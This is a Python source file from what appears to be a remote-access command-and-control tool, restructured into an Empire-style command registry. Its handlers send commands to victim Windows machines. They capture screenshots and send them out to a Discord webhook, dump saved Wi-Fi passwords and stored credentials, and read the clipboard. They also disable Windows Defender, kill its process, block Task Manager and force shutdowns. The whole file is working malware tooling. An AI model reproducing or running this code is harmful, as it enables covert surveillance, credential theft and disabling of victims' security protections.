"""Empire-style command registry for the C2 interactive shell.

Splits the monolithic if/elif dispatch that used to live inside
``C2.C2.interact_with_client`` into a plugin-style registry:

* ``Command`` — metadata (name, aliases, category, description) + handler.
* ``CommandRegistry`` — register / look up / run commands, grouped by
  category, mirroring the classic Empire ``commands/`` layout: one unit of
  behavior per command, discovered and dispatched through a single table.
* ``CmdContext`` — everything a handler needs from the interactive session
  (client manager, client record, socket, username, addr, logger) plus the
  ``send()`` primitive that encapsulates the repetitive send/recv/lock/
  ``command_in_progress`` boilerplate.

Handlers return ``None`` (handled, keep looping), ``"break"`` (leave the
interactive session), ``"continue"`` (skip to the next prompt) or
``"exit"`` (quit the whole C2 console) — the same contract the legacy
``break``/``continue`` statements had inside the old elif chain.

Commands not yet migrated keep their legacy elif blocks in ``C2.C2``; the
interactive loop tries the registry first, then the legacy chain, then the
raw ``CMD:`` fallthrough. Behaviour is byte-identical for migrated commands.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Callable, Dict, List, Optional, Tuple

from config import DISCORD_WEBHOOK, SERVER_IP

# ---------------------------------------------------------------------------
# Categories (mirror the help screen printed by the 'commands' command)
# ---------------------------------------------------------------------------
CATEGORY_FILE_OPS = "File Operations"
CATEGORY_MEDIA = "Media"
CATEGORY_NETWORK = "Network & Internet"
CATEGORY_SYSTEM_INFO = "System Info & Monitoring"
CATEGORY_SYSTEM_CONTROL = "System Control"
CATEGORY_USER_EXEC = "User & Execution"
CATEGORY_UTILITIES = "Utilities"
CATEGORY_DANGER = "Danger Zone"
CATEGORY_HELP = "Help"


# ---------------------------------------------------------------------------
# Core types
# ---------------------------------------------------------------------------
@dataclass
class Command:
    """One C2 command: metadata + the handler that implements it."""

    name: str
    handler: Callable[["CmdContext"], Optional[str]]
    category: str
    description: str
    aliases: Tuple[str, ...] = ()

    @property
    def all_names(self) -> Tuple[str, ...]:
        return (self.name,) + self.aliases


@dataclass
class CmdContext:
    """Everything a command handler needs from the interactive session."""

    cm: object          # ClientManager
    client: dict        # client record (conn, lock, command_in_progress, ...)
    conn: object        # socket
    username: str
    addr: tuple
    logger: Callable[[str], None]   # discord_logger

    def send(self, command: str) -> Tuple[bool, Optional[bytes]]:
        """Send ``CMD:<command>`` under the client lock.

        Mirrors the legacy inline boilerplate: marks ``command_in_progress``,
        sends, and on send failure clears the flag. Returns
        ``(sent, response)``; the caller decides how to react.
        """
        client = self.client
        with client["lock"]:
            client["command_in_progress"] = True
            if not self.cm._send_message(self.conn, f"CMD:{command}"):
                client["command_in_progress"] = False
                return False, None
            response = self.cm._recv_message(self.conn)
        return True, response

    def respond(self, response: Optional[bytes], log_msg: Optional[str] = None) -> None:
        """Print the response and (optionally) log it — legacy boilerplate."""
        if not response:
            return
        text = response.decode("utf-8", errors="ignore")
        print(text)
        if log_msg is not None:
            self.logger(log_msg)
        self.client["command_in_progress"] = False


class CommandRegistry:
    """Look-up table of commands by name and alias."""

    def __init__(self) -> None:
        self._commands: Dict[str, Command] = {}

    def register(self, command: Command) -> Command:
        for name in command.all_names:
            self._commands[name] = command
        return command

    def get(self, name: str) -> Optional[Command]:
        return self._commands.get(name)

    def contains(self, name: str) -> bool:
        return name in self._commands

    def list_commands(self) -> List[Command]:
        seen: Dict[str, Command] = {}
        for cmd in self._commands.values():
            seen[cmd.name] = cmd
        return sorted(seen.values(), key=lambda c: c.name)

    def by_category(self) -> Dict[str, List[Command]]:
        grouped: Dict[str, List[Command]] = {}
        for cmd in self.list_commands():
            grouped.setdefault(cmd.category, []).append(cmd)
        return grouped

    def help_text(self) -> str:
        """Generate a categorized help listing from the registry metadata."""
        lines = ["\n\nQuick Commands: --->"]
        for category in (
            CATEGORY_FILE_OPS, CATEGORY_MEDIA, CATEGORY_NETWORK,
            CATEGORY_SYSTEM_INFO, CATEGORY_SYSTEM_CONTROL, CATEGORY_USER_EXEC,
            CATEGORY_UTILITIES, CATEGORY_DANGER, CATEGORY_HELP,
        ):
            cmds = [c for c in self.list_commands() if c.category == category]
            if not cmds:
                continue
            lines.append(f"\n[📁 {category}]".replace("📁 ", "", 1) if False else f"\n[{category}]")
            for c in cmds:
                lines.append(f"  {c.name:<12}: {c.description}")
        return "\n".join(lines)

    def run(self, name: str, ctx: CmdContext) -> Optional[str]:
        """Run a command by name; returns None if not registered."""
        cmd = self._commands.get(name)
        if cmd is None:
            return None
        return cmd.handler(ctx)


# ---------------------------------------------------------------------------
# Handlers — migrated verbatim from C2.C2.interact_with_client
# ---------------------------------------------------------------------------
def _cmd_screenshot(ctx: CmdContext) -> Optional[str]:
    command2 = (
        'powershell -command "'
        'Add-Type -AssemblyName System.Windows.Forms; '
        'Add-Type -AssemblyName System.Drawing; '
        '$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, '
        '[System.Windows.Forms.SystemInformation]::VirtualScreen.Height); '
        '$graphics = [Drawing.Graphics]::FromImage($bmp); '
        '$graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, '
        '[System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); '
        '$path = Join-Path $env:USERPROFILE \'screenshot.png\'; '
        '$bmp.Save($path)"'
    )
    path2 = "%USERPROFILE%\\screenshot.png"
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    ctx.logger(f"Screenshot from [{ctx.username}]:")
    if response:
        ctx.respond(response, f"Screenshot Taken [{ctx.username}]")

    command3 = f'curl -F "file=@{path2}" -F "content=Screenshot [{ctx.username}]" {DISCORD_WEBHOOK}'
    sent, response = ctx.send(command3)
    if not sent:
        return "break"
    if response:
        ctx.respond(response)
    return None


def _cmd_devices(ctx: CmdContext) -> Optional[str]:
    command2 = 'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg.exe\' } elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') { \'C:\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) { (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source } elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) { (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName } else { $null }; if ($ff) { & $ff -list_devices true -f dshow -i dummy } else { Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' "'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        text = response.decode("utf-8", errors="ignore")
        print(text)
        ctx.logger(f"Devices [{ctx.username}]: {text}")
        ctx.client["command_in_progress"] = False
    return None


def _cmd_wifi(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("netsh wlan show profiles")
    if not sent:
        return "break"
    if response:
        print(response.decode("utf-8", errors="ignore"))
        name = input("Select network: ")
        command2 = (
            'powershell -NoProfile -Command "netsh wlan show profile name=\\"'
            + name
            + '\\" key=clear | Select-String \'(Key Content|\u0e40\u0e19\u0e37\u0e49\u0e2d\u0e2b\u0e32\u0e04\u0e35\u0e22\u0e4c'
            "|Key-Content)\\s*:\\s*(.+)$'"
        )
        sent, response2 = ctx.send(command2)
        if not sent:
            return "break"
        if response2:
            text2 = response2.decode("utf-8", errors="ignore")
            print(text2)
            ctx.client["command_in_progress"] = False
            ctx.logger(f"Wi-Fi password of [{ctx.username}] for the network: {name} is\n{text2}")
    return None


def _cmd_sys(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("systeminfo")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"(sys) [{ctx.username}]\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_task(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("tasklist")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Tasks List [{ctx.username}]\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_shutdown(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("shutdown /s /f /t 0")
    if not sent:
        return "break"
    ctx.logger(f"Shutting down (PC) [{ctx.username}] . . . .")
    if response:
        ctx.respond(response, f"Client [{ctx.username}] Shutdown\n\n{response.decode('utf-8', errors='ignore')}")
    ctx.client["command_in_progress"] = False
    return None


def _cmd_restart(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("shutdown /r /f /t 0")
    if not sent:
        return "break"
    ctx.logger(f"Restarting (PC) [{ctx.username}] . . . .")
    if response:
        ctx.respond(response, f"Client [{ctx.username}] Restarting\n\n{response.decode('utf-8', errors='ignore')}")
    ctx.client["command_in_progress"] = False
    return None


def _cmd_ip(ctx: CmdContext) -> Optional[str]:
    command2 = 'powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        text = response.decode("utf-8", errors="ignore")
        print(text)
        ctx.logger(f"Global IP for {ctx.username}: {text}")
        ctx.client["command_in_progress"] = False
    return None


def _cmd_lock(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("rundll32.exe user32.dll,LockWorkStation")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Locked User [{ctx.username}]\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_disable_task_manager(ctx: CmdContext) -> Optional[str]:
    command2 = r'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Task Manager Disabled for [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_enable_task_manager(ctx: CmdContext) -> Optional[str]:
    command2 = r'REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Task Manager Enabled for [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_recycle(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Emptied Recycle Bin on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_clipboard(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send('powershell -command "Get-Clipboard"')
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Clipboard [{ctx.username}]: \n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_rickroll(ctx: CmdContext) -> Optional[str]:
    command2 = (
        'start msedge --autoplay-policy=no-user-gesture-required '
        '"https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1" '
        '|| start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1'
    )
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"RickRoll video played on {ctx.username}\n\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_netscan(ctx: CmdContext) -> Optional[str]:
    command2 = 'powershell -NoProfile -Command "$ipPrefix = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike \'127.*\' -and $_.IPAddress -notlike \'169.254.*\' } | Select-Object -First 1).IPAddress -replace \'\\.\\d+$\'); if ($ipPrefix) { 1..254 | ForEach-Object { $target = \\"$ipPrefix.$_\\"; if (Test-Connection -ComputerName $target -Count 1 -Quiet -TimeoutMs 200) { \\"$target - $(Resolve-DnsName $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty NameHost -ErrorAction SilentlyContinue)\\" } } } else { Write-Error \'No active IPv4 interface found.\' }"'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"[{ctx.username}] netscan:\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_info(ctx: CmdContext) -> Optional[str]:
    command2 = (
        'powershell -Command "Get-ComputerInfo | Select OSName,OSVersion,WindowsVersion,CSName,'
        'CSDomain,BIOSManufacturer | Format-List; Get-WmiObject Win32_Battery | '
        'Select EstimatedChargeRemaining"'
    )
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Got all machine info of [{ctx.username}]:\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_killav(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
    if not sent:
        return "break"
    if response:
        ctx.respond(
            response,
            f"Disabled Windows Defender AV on [{ctx.username}]\n\n {response.decode('utf-8', errors='ignore')}",
        )
    sent, response = ctx.send("taskkill /F /IM MsMpEng.exe")
    if not sent:
        return "break"
    if response:
        print(response.decode("utf-8", errors="ignore"))
    return None


def _cmd_creds(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("cmdkey /list > %TEMP%\\creds.txt")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"[{ctx.username}] Creds:\n{response.decode('utf-8', errors='ignore')}")
    return None


# ---------------------------------------------------------------------------
# Registry singleton — populated at import time (Empire-style discovery point)
# ---------------------------------------------------------------------------
command_registry = CommandRegistry()

command_registry.register(Command("screenshot", _cmd_screenshot, CATEGORY_MEDIA,
                                  "Take Screenshot and send it to the host"))
command_registry.register(Command("devices", _cmd_devices, CATEGORY_SYSTEM_INFO,
                                  "Shows the available devices"))
command_registry.register(Command("wifi", _cmd_wifi, CATEGORY_NETWORK,
                                  "Shows the wifi passwords"))
command_registry.register(Command("sys", _cmd_sys, CATEGORY_SYSTEM_INFO,
                                  "Shows all system info (Hardware/Software)", aliases=("system",)))
command_registry.register(Command("task", _cmd_task, CATEGORY_SYSTEM_INFO,
                                  "Shows all of the running tasks"))
command_registry.register(Command("shutdown", _cmd_shutdown, CATEGORY_SYSTEM_CONTROL,
                                  "Force Shutdown to the client", aliases=("off",)))
command_registry.register(Command("restart", _cmd_restart, CATEGORY_SYSTEM_CONTROL,
                                  "Force restart to the client"))
command_registry.register(Command("ip", _cmd_ip, CATEGORY_NETWORK,
                                  "Get the client's Public IP"))
command_registry.register(Command("lock", _cmd_lock, CATEGORY_SYSTEM_CONTROL,
                                  "Lockscreen (Client)"))
command_registry.register(Command("disable task manager", _cmd_disable_task_manager, CATEGORY_SYSTEM_CONTROL,
                                  "Disable the Task Manager"))
command_registry.register(Command("enable task manager", _cmd_enable_task_manager, CATEGORY_SYSTEM_CONTROL,
                                  "Enable the Task Manager"))
command_registry.register(Command("recycle", _cmd_recycle, CATEGORY_UTILITIES,
                                  "Empty the recycle bin"))
command_registry.register(Command("clipboard", _cmd_clipboard, CATEGORY_SYSTEM_INFO,
                                  "Show the last copied thing"))
command_registry.register(Command("rickroll", _cmd_rickroll, CATEGORY_MEDIA,
                                  "Play a Rickroll video"))
command_registry.register(Command("netscan", _cmd_netscan, CATEGORY_NETWORK,
                                  "Scan local network for devices and informations"))
command_registry.register(Command("info", _cmd_info, CATEGORY_SYSTEM_INFO,
                                  "Get all machine info"))
command_registry.register(Command("killav", _cmd_killav, CATEGORY_SYSTEM_CONTROL,
                                  "Disable Windows Defender Anti-Virus"))
command_registry.register(Command("creds", _cmd_creds, CATEGORY_SYSTEM_INFO,
                                  "Get all windows credentials"))
